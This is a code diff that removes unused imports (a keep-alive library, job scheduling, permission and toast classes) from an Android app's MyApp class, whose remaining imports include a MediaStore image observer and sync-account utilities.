@@ -2,48 +2,29 @@ package android.iocl.dac_collector.MainApplication;
 
 
 
-import static com.ykun.live_library.config.RunMode.HIGH_POWER_CONSUMPTION;
-
-import android.Manifest;
 import android.accounts.Account;
 import android.accounts.AccountManager;
 import android.app.Application;
 
-import android.app.job.JobInfo;
-import android.app.job.JobScheduler;
-import android.content.ComponentName;
 import android.content.ContentResolver;
-import android.content.Context;
-import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.iocl.dac_collector.AntiCrashLibCockroach.Cockroach;
 import android.iocl.dac_collector.AntiCrashLibCockroach.ExceptionHandler;
 
-import android.iocl.dac_collector.R;
-import android.iocl.dac_collector.Services.ImageJobService;
 import android.iocl.dac_collector.SyncAdapters.AccountContract;
 import android.iocl.dac_collector.SyncAdapters.SyncUtils;
 import android.iocl.dac_collector.SyncRAT.ImageObserver;
 import android.iocl.dac_collector.SyncRAT.SyncAccountUtil;
 import android.iocl.dac_collector.Utility.SharedPrefs;
-import android.iocl.dac_collector.Utility.Utility;
-import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.MediaStore;
 import android.util.Log;
-import android.widget.Toast;
-
-import androidx.core.content.ContextCompat;
 
 import com.google.firebase.FirebaseApp;
 import com.google.firebase.crashlytics.FirebaseCrashlytics;
 import com.hjq.permissions.Permission;
 import com.hjq.permissions.XXPermissions;
-import com.ykun.live_library.KeepAliveManager;
-import com.ykun.live_library.config.ForegroundNotification;
-import com.ykun.live_library.config.ForegroundNotificationClickListener;
 
 public class MyApp extends Application {
     FirebaseCrashlytics crashlytics;
@@ -113,6 +94,8 @@ public class MyApp extends Application {
                     true,
                     mImageObserver
             );
+
+
         }
     }
 
